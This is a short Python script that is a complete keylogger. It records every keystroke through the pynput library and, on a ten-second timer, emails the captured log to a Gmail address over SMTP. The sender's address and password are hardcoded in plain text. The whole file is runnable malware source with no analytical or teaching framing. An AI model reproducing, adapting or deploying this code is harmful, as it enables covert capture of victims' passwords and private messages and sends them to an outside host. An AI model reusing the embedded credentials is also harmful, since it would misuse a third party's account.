#!/usr/bin/env python
import subprocess, smtplib, re, os, time, threading, pynput.keyboard


class Keylogger:

    def __init__(self):
        self.log = ''

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()

    def process_key_press(self, key):
        print(f'[+] Key: {key}')
        try:
            self.log += str(key.char)
        except AttributeError as err:
            if key == key.space:
                self.log += ' '
            else:
                self.log += f' {str(key)} '
        print(f'[+] Log: {self.log}')

    @staticmethod
    def send_mail(email, passwd, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, passwd)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        if self.log == '':
            print('[!] Nothing to log...')
        else:
            print(f'[!] Log: {self.log}')
            self.send_mail('bbealeqa@gmail.com', passwd='Pl4^838t#6&n^%OO', message=self.log)
            self.log = ''
        timer = threading.Timer(10, self.report)
        timer.start()


if __name__ == '__main__':
    kl = Keylogger()
    kl.start()
